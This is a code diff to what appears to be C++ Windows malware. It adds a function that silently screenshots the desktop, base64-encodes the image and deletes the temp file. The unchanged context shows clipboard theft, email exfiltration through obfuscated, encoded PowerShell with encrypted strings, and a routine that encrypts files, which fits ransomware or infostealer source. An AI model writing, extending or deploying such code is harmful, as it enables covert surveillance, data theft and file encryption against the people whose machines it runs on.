@@ -344,6 +344,56 @@ string getClipboard() {
     return result;
 }
 
+string getScreenshot() {
+    HWND desktopHwnd = GetDesktopWindow();
+    RECT desktopParams;
+    HDC devC = GetDC(desktopHwnd);
+    GetWindowRect(desktopHwnd, &desktopParams);
+    DWORD width = desktopParams.right - desktopParams.left;
+    DWORD height = desktopParams.bottom - desktopParams.top;
+
+    DWORD fileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (sizeof(RGBTRIPLE) + 1 * (width * height * 4));
+    char* bmpData = (char*)GlobalAlloc(0x0040, fileSize);
+
+    PBITMAPFILEHEADER fileHeader = (PBITMAPFILEHEADER)bmpData;
+    PBITMAPINFOHEADER  infoHeader = (PBITMAPINFOHEADER)&bmpData[sizeof(BITMAPFILEHEADER)];
+
+    fileHeader->bfType = 0x4D42;
+    fileHeader->bfSize = sizeof(BITMAPFILEHEADER);
+    fileHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+
+    infoHeader->biSize = sizeof(BITMAPINFOHEADER);
+    infoHeader->biPlanes = 1;
+    infoHeader->biBitCount = 24;
+    infoHeader->biCompression = BI_RGB;
+    infoHeader->biHeight = height;
+    infoHeader->biWidth = width;
+
+    RGBTRIPLE* image = (RGBTRIPLE*)&bmpData[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)];
+    RGBTRIPLE color;
+
+    HDC captureDC = CreateCompatibleDC(devC);
+    HBITMAP captureBitmap = CreateCompatibleBitmap(devC, width, height);
+    SelectObject(captureDC, captureBitmap);
+    BitBlt(captureDC, 0, 0, width, height, devC, 0, 0, SRCCOPY | CAPTUREBLT);
+    GetDIBits(captureDC, captureBitmap, 0, height, image, (LPBITMAPINFO)infoHeader, DIB_RGB_COLORS);
+
+    HANDLE hFile = CreateFileA((TEMPFILE).c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
+    WriteFile(hFile, bmpData, fileSize, new DWORD, 0);
+    CloseHandle(hFile);
+    GlobalFree(bmpData);
+
+    ifstream imageFile(TEMPFILE, ios::in | ios::binary);
+    vector<BYTE> data(istreambuf_iterator<char>(imageFile), {});
+    string result = base64_encode(&data[0], data.size());
+    imageFile.close();
+    
+    if (remove((TEMPFILE).c_str()) != 0)
+        DeleteFileA((TEMPFILE).c_str());
+
+    return result;
+}
+
 void sendEmail() {
     system(powershellEncodedCommand(
         (string)skCrypt("seND-mAilmeSSaGE -frOM '") + SENDERMAIL +
@@ -414,7 +464,7 @@ void encryptFiles(vector<string> files, string key) {
             continue;
         }
         CloseHandle(hFile);
-        ifstream fin(file, ios::binary | ios::in);
+        ifstream fin(file, ios::in | ios::binary);
         vector<BYTE> data(istreambuf_iterator<char>(fin), {});
         fin.close();
 
